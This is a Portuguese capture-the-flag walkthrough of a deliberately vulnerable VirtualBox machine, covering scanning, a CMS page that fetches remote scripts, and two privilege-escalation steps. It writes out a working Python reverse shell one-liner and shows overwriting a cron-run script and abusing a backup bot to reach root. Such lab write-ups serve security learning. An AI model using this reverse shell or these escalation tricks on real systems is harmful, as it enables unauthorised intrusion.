1) Máquina importada no VirtualBox, executo o arp-scan para ver o endereço IP:
```
root@parrot:~# arp-scan --interface=eth0 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:79:a6:a0, IPv4: 192.168.56.105
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:7c:9f:5d       PCS Systemtechnik GmbH
192.168.56.104  08:00:27:3d:f6:30       PCS Systemtechnik GmbH

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 3 responded
```
Está rodando no endereço de final 104.

2) Rodo o nmap para verificar as portas e serviços:
```
root@parrot:~# nmap -p- -sV -sC -T5 -A -oN nmap_broken 192.168.56.104
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-15 14:22 -03
Nmap scan report for broken (192.168.56.104)
Host is up (0.00046s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 7e:f3:33:8c:be:0c:ed:d7:0e:c6:67:cc:73:bf:c0:ab (RSA)
|   256 ee:ed:74:02:0d:3f:7d:6d:45:aa:ff:f3:3a:d0:1a:d9 (ECDSA)
|_  256 d1:18:a9:ef:7f:b6:c8:a9:30:52:c8:e6:b6:ec:64:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: hacked
MAC Address: 08:00:27:3D:F6:30 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms broken (192.168.56.104)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
```

Duas portas comuns em CTF's, 22 rodando ssh e a 80 um serviço web. De pronto identifico que é uma versão bem recente do OpenSSH, não lembro de ter lido nada a respeito de nenhuma falha relevante de segurança, parto para o serviço web.

3) Com o intuito de identificar as URL's que estão executando sob o Apache, executo o gobuster:
```
root@parrot:~# gobuster dir -u http://192.168.56.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_broken
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.104
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/15 14:26:36 Starting gobuster
===============================================================
/images (Status: 301)
/cms (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/15 14:27:49 Finished
```
Checo o que está respondendo no contexto /cms. Tem um botão, eu clico e... Curioso testo uma possível abertura para Path Traversal ou Command Injection e recebo a primeira flag:

4) Executo novamente o gobuster a partir de /cms:
```
root@parrot:~# gobuster dir -u http://192.168.56.104/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_broken_cms
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.104/cms
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/15 14:30:30 Starting gobuster
===============================================================
/cc (Status: 301)
===============================================================
2020/08/15 14:31:34 Finished
===============================================================
```
Checo o novo contexto identifico e me deparo com a seguinte página:

Uau, será que podemos hackear qualquer servidor passando IP/porta? Vamos testar, executo um listener via netcat, coloco meu endereço IP e a porta que estou executando e clico em 'hack':
```
root@parrot:~# nc -nlvp 31337
listening on [any] 31337 ...
connect to [192.168.56.105] from (UNKNOWN) [192.168.56.104] 50500
GET /5eeea87977793dc143b995f6a104d62d.sh HTTP/1.0
Host: 192.168.56.105:31337
Connection: close
```
Interessante, ele tentou um GET no meu endereço buscando esse .sh. Bom, o que podemos fazer? Vamos reproduzir o que ele busca, crio um '5eeea87977793dc143b995f6a104d62d.sh' com um shell reverso:
```
root@parrot:/tmp/broken# cat 5eeea87977793dc143b995f6a104d62d.sh
#!/bin/bash

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.105",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Subo um servidor web via python para ele buscar o .sh e mantenho um listener netcat com a porta que adicionei na linha do shell reverso. Clico novamente em 'hack' e:
```
root@parrot:~# nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.56.105] from (UNKNOWN) [192.168.56.104] 59902
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/var/www/html/cms/cc
```
Estou dentro! Agora vamos continuar caçando.

5) Vou ao /home e encontro o diretório da alice, lá consigo mais uma flag. Lá também tem uma nota com o seguinte conteúdo:

Alice,

Please do not install TrustMeCMS, I need check the source before

PS: I created a script to clear apache log during the tests

root

Ok senhor root, obrigado pela informação.

6) Ainda na home da alice tem um diretório chamado 'script', dentro dele um script em python e um .log, interessante.

7) Rodo o linpeas.sh e não vejo nada de interessante na saída, ao executar o pspy64 para checar se existe algo agendado, eis que:
```
2020/08/15 00:08:01 CMD: UID=0    PID=23585  | /bin/sh -c sudo -u alice python /home/alice/script/log.py
2020/08/15 00:08:01 CMD: UID=0    PID=23587  | sudo -u alice python /home/alice/script/log.py
```
Bom, acho que a partir daí vou escalar os meus privilégios.

8) Para a minha surpresa ao voltar ao diretório 'script' tenho permissão de gravação, bom, vou substituir o arquivo log.py pelo MEU log.py :)

9) Faço a substituição com o mesmo script que utilizei como shell reverso (organizado com os imports e as outras linhas ordenadas), configuro novamente um listener via netcat e aguardo o agendamento:
```
$ whoami
whoami
alice
```
Ótimo, agora sou a alice rsrs.

10) Agora tenho permissão de acesso a um diretório que antes não conseguia abrir, o 'backup'. A, e tem outra flag lá.

11) Em mais uma nota do senhor root ele diz o seguinte:
```
Alice we have been hacked !

Please put the path of the website backup directory in path.txt, my bot will do the rest

thx

root
```
Agora te peguei! Adiciono o /root no path.txt e pouco tempo depois tenho o diretório do root no backup, lá dentro tem a última flag:
```
Congratulation for the root flag !

     _________
    / ======= \
   / __________\
  | ___________ |
  | | -root-  | |
  | |         | |
  | |_________| |_____________________________________________________________________
  \=____________/                     enjoyed this VM ?                               )
  / """"""""""" \                     I love bitcoin                                 /
 / ::::::::::::: \           1Ba6vFEamUenzrXr4scGQ8QLya7t7zYZ1S                  =D-'
(_________________)
```

Bem divertido, obrigado EuSecuinfo pela box.
